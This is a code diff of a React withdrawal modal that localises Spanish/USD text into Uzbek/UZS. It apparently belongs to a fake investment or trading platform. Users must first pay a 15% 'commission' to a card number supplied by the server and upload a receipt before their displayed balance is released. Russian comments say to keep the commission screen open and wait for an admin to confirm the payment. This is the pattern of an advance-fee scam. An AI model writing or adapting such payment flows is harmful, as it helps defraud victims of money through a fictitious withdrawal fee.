@@ -152,13 +152,13 @@ const WithdrawModal = ({ isOpen, onClose }) => {
     const newUserBalance = userBalance - withdrawAmount;
     
     // Проверки
-    if (withdrawAmount < 945) {
-      alert('Monto mínimo de retiro: 945 USD');
+    if (withdrawAmount < 12000000) {
+      alert('Eng kam yechish summasi: 12,000,000 UZS');
       return;
     }
 
     if (totalAmount > userBalance) {
-      alert(`¡Saldo insuficiente!\n\Solicitado: ${withdrawAmount.toLocaleString()} USD\Comisión: ${(withdrawAmount * 0.15).toLocaleString()} USD\nTotal: ${totalAmount.toLocaleString()} USD\nTu saldo: ${userBalance.toLocaleString()} USD`);
+      alert(`Balansda mablag‘ yetarli emas!\n\So‘ralgan: ${withdrawAmount.toLocaleString()} UZS\nKomissiya: ${(withdrawAmount * 0.15).toLocaleString()} UZS\nJami: ${totalAmount.toLocaleString()} UZS\nSizning balansingiz: ${userBalance.toLocaleString()} UZS`);
       return;
     }
 
@@ -210,7 +210,7 @@ const WithdrawModal = ({ isOpen, onClose }) => {
       const data = await response.json();
 
       if (response.ok) {
-        alert('¡Solicitud de retiro enviada! Los fondos se transferirán dentro de 30 minutos.');
+        alert('Pul yechish so‘rovi yuborildi! Mablag‘ 30 daqiqa ichida o‘tkaziladi.');
         // 🔹 НЕ ЗАКРЫВАЕМ МОДАЛКУ, оставляем окно комиссии открытым
         onClose(); // 🔹 УБИРАЕМ эту строку
         
@@ -225,11 +225,11 @@ const WithdrawModal = ({ isOpen, onClose }) => {
         // 🔹 ЖДЕМ ПОДТВЕРЖДЕНИЯ ОПЛАТЫ ОТ АДМИНА
         // Здесь можно добавить опрос сервера на статус оплаты
       } else {
-        alert(data.message || 'Error en la solicitud de retiro');
+        alert(data.message || 'Pul yechish so‘rovida xatolik');
       }
     } catch (error) {
       console.error('Error:', error);
-        alert('Error al conectar con el servidor');
+        alert('Server bilan ulanishda xatolik');
     } finally {
       setLoading(false);
     }
@@ -252,7 +252,7 @@ const WithdrawModal = ({ isOpen, onClose }) => {
           )}*/}
           <h2 className="withdraw-modal-title">
             <CreditCard className="withdraw-modal-icon" />
-            {step === 1 ? 'Retirar fondos' : 'Pagar comisión'}
+            {step === 1 ? 'Pul yechish' : 'Komissiyani to‘lash'}
           </h2>
           <button onClick={onClose} className="close-button">
             <X size={20} />
@@ -262,50 +262,50 @@ const WithdrawModal = ({ isOpen, onClose }) => {
         {step === 1 ? (
           <form onSubmit={handleStep1Submit} className="withdraw-form">
             <div className="balance-info">
-              💰 Tu saldo: <strong>{userBalance.toLocaleString()} USD</strong>
+              💰 Sizning balansingiz: <strong>{userBalance.toLocaleString()} UZS</strong>
             </div>
 
             <div className="min-amount-info">
-              💸 Ingresa <strong>950 USD</strong>
+              💸 Kiriting <strong>12,000,000 UZS</strong>
             </div>
 
             <div className="form-group">
-              <label className="form-label">Monto a retirar (USD)</label>
+              <label className="form-label">Yechib olinadigan summa (UZS)</label>
               <input
                 type="number"
                 value={amount}
                 onChange={(e) => setAmount(e.target.value)}
-                placeholder="Ingresa desde 950"
+                placeholder="12,000,000 dan kiriting"
                 className="form-input"
-                min="950"
-                step="50"
+                min="12000000"
+                step="1000"
                 required
               />
             </div>
 
             {/* Информация о расчетах */}
-            {amount && parseFloat(amount) >= 950 && (
+            {amount && parseFloat(amount) >= 12000000 && (
               <div className="calculation-preview">
                 <div className="calculation-row">
-                  <span>Monto a retirar:</span>
-                  <span>{parseFloat(amount).toLocaleString()} USD</span>
+                  <span>Yechib olinadigan summa:</span>
+                  <span>{parseFloat(amount).toLocaleString()} UZS</span>
                 </div>
                 {/*<div className="calculation-row">
                   <span>Комиссия (15%):</span>
                   <span>{commissionAmount.toLocaleString()} UZS</span>
                 </div>*/}
                 <div className="calculation-row total">
-                  <span>Monto total del retiro:</span>
-                  <span>{safeAmount.toLocaleString()} USD</span>
+                  <span>Jami yechish summasi:</span>
+                  <span>{safeAmount.toLocaleString()} UZS</span>
                 </div>
                 <div className={`balance-check ${safeAmount <= userBalance ? 'sufficient' : 'insufficient'}`}>
-                  {safeAmount <= userBalance ? '✅ Saldo suficiente' : '❌ Saldo insuficiente'}
+                  {safeAmount <= userBalance ? '✅ Mablag‘ yetarli' : '❌ Mablag‘ yetarli emas'}
                 </div>
               </div>
             )}
 
             <div className="form-group">
-              <label className="form-label">Número de tarjeta</label>
+              <label className="form-label">Karta raqami</label>
               <input
                 type="text"
                 value={cardNumber}
@@ -317,12 +317,12 @@ const WithdrawModal = ({ isOpen, onClose }) => {
             </div>
 
             <div className="form-group">
-              <label className="form-label">Nombre y apellido</label>
+              <label className="form-label">Ism va familiya</label>
               <input
                 type="text"
                 value={fullName}
                 onChange={(e) => setFullName(e.target.value)}
-                placeholder="Ingresa el nombre y apellido de la tarjeta"
+                placeholder="Kartadagi ism va familiyani kiriting"
                 className="form-input"
                 required
               />
@@ -333,7 +333,7 @@ const WithdrawModal = ({ isOpen, onClose }) => {
               className="submit-button primary"
               disabled={amount && safeAmount > userBalance}
             >
-             Continuar
+              Davom etish
             </button>
           </form>
         ) : (
@@ -344,37 +344,37 @@ const WithdrawModal = ({ isOpen, onClose }) => {
 
             <div className="calculation-section">
               <div className="calculation-row">
-                <span>Monto a retirar:</span>
-                <span>{safeAmount.toLocaleString()} USD</span>
+                <span>Yechib olinadigan summa:</span>
+                <span>{safeAmount.toLocaleString()} UZS</span>
               </div>
               <div className="calculation-row">
-                <span>Comisión (15%):</span>
-                <span>{safeCommission.toLocaleString()} USD</span>
+                <span>Komissiya (15%):</span>
+                <span>{safeCommission.toLocaleString()} UZS</span>
               </div>
               <div className="calculation-row total">
-                <span>Pago de comisión:</span>
-                <span>{safeCommission.toLocaleString()} USD</span>
+                <span>Komissiya uchun to‘lov:</span>
+                <span>{safeCommission.toLocaleString()} UZS</span>
               </div>
             </div>
 
 
             <div className="payment-details">
-              <p className="details-label">Datos para el pago de la comisión:</p>
+              <p className="details-label">Komissiyani to‘lash uchun rekvizitlar:</p>
               <div className="card-number">
-                💳 Tarjeta: {cardLoading ? "Cargando..." : cardNumber}
+                💳 Karta: {cardLoading ? "Yuklanmoqda..." : cardNumber}
               </div>
               <div className="card-holder">
-                👤 Titular: {cardLoading ? "Cargando..." : cardHolderName}
+                👤 Ega: {cardLoading ? "Yuklanmoqda..." : cardHolderName}
               </div>
             </div>
 
             <div className="file-section">
               <p className="file-warning">
-                ⚠️ Después de realizar el pago de la comisión, asegúrate de enviar el comprobante (recibo)
+                ⚠️ Komissiyani to‘laganingizdan so‘ng kvitansiyani (chekni) ALBATTA yuboring
               </p>
               <label className="file-upload">
                 <Upload className="upload-icon" />
-                <span>{file ? file.name : "Adjunta el comprobante del pago de la comisión"}</span>
+                <span>{file ? file.name : "Komissiya to‘lovi kvitansiyasini biriktiring"}</span>
                 <input 
                   type="file" 
                   onChange={handleFileChange}
@@ -386,7 +386,7 @@ const WithdrawModal = ({ isOpen, onClose }) => {
             </div>
 
             <button type="submit" className="submit-button primary" disabled={loading}>
-              {loading ? 'Enviando...' : 'Pagar comisión y retirar fondos'}
+              {loading ? 'Yuborilmoqda...' : 'Komissiyani to‘lash va yechib olish'}
             </button>
           </form>
         )}
